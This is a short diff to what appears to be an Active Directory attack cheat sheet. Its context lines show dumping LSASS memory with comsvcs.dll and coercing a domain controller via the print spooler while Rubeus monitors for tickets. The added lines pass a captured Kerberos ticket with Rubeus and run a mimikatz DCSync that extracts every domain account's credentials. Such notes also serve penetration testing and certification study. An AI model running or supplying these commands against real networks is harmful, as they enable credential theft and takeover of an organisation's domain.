@@ -908,6 +908,10 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 736 C:\Windows\Tasks\lsas
 $ Rubeus.exe monitor /interval:5
 * Use spoolsample.exe to initiate spooler connection
 $ spollssample.exe web.eu.local dc.eu.local
+* Get the ticket
+$ rubeus.exe ptt /ticket:<pasete-b64-ticket>
+* DCSync
+$ mimikatz# lsadump::dcsync /domain:fqdn.local /all /csv
 
 [Get Shadow Principal]
 >> Use AD Module/RSAT
